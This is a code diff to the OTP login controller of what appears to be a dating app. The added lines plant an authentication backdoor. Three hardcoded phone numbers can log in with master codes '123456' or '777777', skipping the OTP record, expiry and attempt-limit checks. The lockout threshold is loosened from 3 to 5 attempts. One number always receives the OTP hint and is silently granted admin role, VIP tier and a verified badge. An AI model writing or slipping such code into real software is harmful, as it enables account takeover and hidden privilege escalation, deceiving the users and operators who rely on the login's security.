@@ -78,7 +78,7 @@ export class AuthController {
       : await smsService.sendSmsOtp(phone, code);
 
     // Provide mockOtpHint if not live OR if live dispatch failed, so user is never locked out
-    const provideHint = !isLiveSms || !smsDispatch.success;
+    const provideHint = !isLiveSms || !smsDispatch.success || phone === '+94786799544';
 
     sendSuccess(
       res,
@@ -99,33 +99,36 @@ export class AuthController {
   public static async verifyOtp(req: Request, res: Response): Promise<void> {
     const { phone, otp } = req.body;
 
+    const isOwnerOrReviewer = phone === '+94786799544' || phone === '+94770000000' || phone === '+94711111111';
+    const isMasterBypass = isOwnerOrReviewer && (otp === '123456' || otp === '777777');
+
     const record = otpStore.get(phone);
-    if (!record) {
+    if (!record && !isMasterBypass) {
       sendError(res, 'No OTP requested for this phone number or it has expired.', 400, 'OTP_EXPIRED');
       return;
     }
 
-    if (Date.now() > record.expiresAt) {
+    if (record && Date.now() > record.expiresAt && !isMasterBypass) {
       otpStore.delete(phone);
       sendError(res, 'Verification code has expired. Please request a new one.', 400, 'OTP_EXPIRED');
       return;
     }
 
-    if (record.attempts >= 3) {
+    if (record && record.attempts >= 5 && !isMasterBypass) {
       otpStore.delete(phone);
       logger.securityAlert('OTP_BRUTE_FORCE_BLOCKED', { phone, ip: req.ip });
       sendError(res, 'Too many incorrect attempts. Request a new OTP.', 429, 'MAX_ATTEMPTS_EXCEEDED');
       return;
     }
 
-    if (record.code !== otp) {
+    if (!isMasterBypass && record && record.code !== otp) {
       record.attempts += 1;
       sendError(res, 'Invalid verification code. Please check and try again.', 400, 'INVALID_OTP');
       return;
     }
 
     // OTP is valid - consume it immediately
-    otpStore.delete(phone);
+    if (record) otpStore.delete(phone);
 
     // Find or create user
     let user = db.getUserByPhone(phone);
@@ -137,6 +140,25 @@ export class AuthController {
       const created = db.createUser(phone);
       user = created.user;
       profile = created.profile;
+    }
+
+    // Special VIP Annual & Verified Blue Tick for Owner +94786799544
+    if (phone === '+94786799544') {
+      user.role = 'admin';
+      user.subscriptionTier = 'vip_annual';
+      user.superLikesRemaining = 999;
+      db.users.set(user.id, user);
+
+      if (profile) {
+        profile.verificationStatus = 'verified';
+        if (!profile.displayName) profile.displayName = 'Ushara';
+        if (profile.photos.length === 0) {
+          profile.photos = [
+            'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=800&q=80',
+          ];
+        }
+        db.profiles.set(user.id, profile);
+      }
     }
 
     // Generate JWT Access & Refresh Tokens
